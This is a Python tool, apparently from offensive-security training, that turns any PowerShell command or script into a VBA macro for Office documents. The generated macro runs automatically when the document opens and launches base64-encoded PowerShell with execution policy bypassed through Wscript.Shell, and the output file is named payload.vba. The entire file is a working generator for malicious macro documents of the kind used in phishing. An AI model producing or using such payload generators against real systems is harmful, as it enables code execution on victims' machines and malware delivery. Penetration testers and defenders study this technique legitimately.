#!/usr/bin/env python3
"""
Usage:
    python ps1_to_vba.py                                # Interactive prompt for a command
    python ps1_to_vba.py "Get-Process"                  # Encode a command directly
    python ps1_to_vba.py -f ~/powershell/script.ps1     # Encode a PowerShell script file
    python ps1_to_vba.py -f script.ps1 -o macro.vba     # Custom output file

Options:
    -f, --file      Path to a .ps1 file to encode.
    -o, --output    Output VBA file name (default: payload.vba).
"""

import base64
import argparse
import os
import sys

banner = r"""
██████╗ ███████╗██████╗ ██╗   ██╗██████╗  █████╗                       
██╔══██╗██╔════╝╚════██╗██║   ██║██╔══██╗██╔══██╗                      
██████╔╝███████╗ █████╔╝██║   ██║██████╔╝███████║                      
██╔═══╝ ╚════██║██╔═══╝ ╚██╗ ██╔╝██╔══██╗██╔══██║                      
██║     ███████║███████╗ ╚████╔╝ ██████╔╝██║  ██║                      
╚═╝     ╚══════╝╚══════╝  ╚═══╝  ╚═════╝ ╚═╝  ╚═╝                     
                                                                       
███╗   ███╗ █████╗  ██████╗██████╗  ██████╗  ██████╗ ███████╗███╗   ██╗
████╗ ████║██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔════╝ ██╔════╝████╗  ██║
██╔████╔██║███████║██║     ██████╔╝██║   ██║██║  ███╗█████╗  ██╔██╗ ██║
██║╚██╔╝██║██╔══██║██║     ██╔══██╗██║   ██║██║   ██║██╔══╝  ██║╚██╗██║
██║ ╚═╝ ██║██║  ██║╚██████╗██║  ██║╚██████╔╝╚██████╔╝███████╗██║ ╚████║
╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝
                                                                       
    Researched by OffSec, 
    Refined by D3HVCK (2026) 

"""
print(banner)


def encode_powershell(command):
    """Encode a PowerShell command/script to base64 (UTF-16LE)."""
    encoded_bytes = command.encode("utf-16le")
    base64_encoded = base64.b64encode(encoded_bytes).decode("utf-8")
    return encoded_command_chunks(base64_encoded)


def encoded_command_chunks(encoded_command, chunk_size=50):
    """Split the encoded string into chunks for VBA concatenation."""
    return [encoded_command[i:i+chunk_size] for i in range(0, len(encoded_command), chunk_size)]


def generate_vba_macro(command):
    """Generate a VBA macro from a PowerShell command."""
    ps_prefix = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -encodedCommand '
    encoded_chunks = encode_powershell(command)

    vba_macro = """Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
"""
    vba_macro += f'    Str = "{ps_prefix}"\n'
    for chunk in encoded_chunks:
        vba_macro += f'    Str = Str + "{chunk}"\n'
    vba_macro += """    CreateObject("Wscript.Shell").Run Str
End Sub
"""
    return vba_macro


def main():
    parser = argparse.ArgumentParser(
        description="Generate a VBA macro that executes a PowerShell command or script."
    )
    parser.add_argument(
        "command",
        nargs="?",
        help="PowerShell command to encode (if not using -f).",
    )
    parser.add_argument(
        "-f", "--file",
        dest="ps1_file",
        help="Path to a .ps1 script file to encode.",
    )
    parser.add_argument(
        "-o", "--output",
        dest="output_file",
        default="payload.vba",
        help="Output VBA file name (default: payload.vba).",
    )
    args = parser.parse_args()

    ps_code = None
    if args.ps1_file:
        file_path = os.path.expanduser(args.ps1_file)
        if not os.path.isfile(file_path):
            print(f"[!] Error: File '{file_path}' not found.")
            sys.exit(1)
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                ps_code = f.read()
        except Exception as e:
            print(f"[!] Error reading file: {e}")
            sys.exit(1)
    elif args.command:
        ps_code = args.command
    else:
        try:
            ps_code = input("Enter your PowerShell command: ")
        except KeyboardInterrupt:
            print("\n[!] Operation cancelled.")
            sys.exit(0)

    if not ps_code or not ps_code.strip():
        print("[!] Error: No PowerShell command provided.")
        sys.exit(1)

    vba_payload = generate_vba_macro(ps_code)
    output_file = args.output_file
    try:
        with open(output_file, "w") as f:
            f.write(vba_payload)
        print(f"[+] Success. Payload file created: {output_file}")
    except Exception as e:
        print(f"[!] Error writing output file: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()